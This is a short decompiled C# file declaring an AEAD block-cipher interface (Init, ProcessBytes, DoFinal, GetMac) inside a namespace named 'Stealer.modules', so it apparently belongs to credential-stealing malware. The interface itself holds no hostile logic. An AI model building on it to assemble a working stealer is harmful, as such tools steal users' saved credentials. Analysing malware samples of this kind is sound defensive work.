using System;

namespace Stealer.modules
{
	// Token: 0x0200000E RID: 14
	public interface IAeadBlockCipher
	{
		// Token: 0x17000002 RID: 2
		// (get) Token: 0x0600003E RID: 62
		string AlgorithmName { get; }

		// Token: 0x0600003F RID: 63
		void Init(bool forEncryption, ICipherParameters parameters);

		// Token: 0x06000040 RID: 64
		int GetBlockSize();

		// Token: 0x06000041 RID: 65
		int ProcessByte(byte input, byte[] outBytes, int outOff);

		// Token: 0x06000042 RID: 66
		int ProcessBytes(byte[] inBytes, int inOff, int len, byte[] outBytes, int outOff);

		// Token: 0x06000043 RID: 67
		int DoFinal(byte[] outBytes, int outOff);

		// Token: 0x06000044 RID: 68
		byte[] GetMac();

		// Token: 0x06000045 RID: 69
		int GetUpdateOutputSize(int len);

		// Token: 0x06000046 RID: 70
		int GetOutputSize(int len);

		// Token: 0x06000047 RID: 71
		void Reset();
	}
}
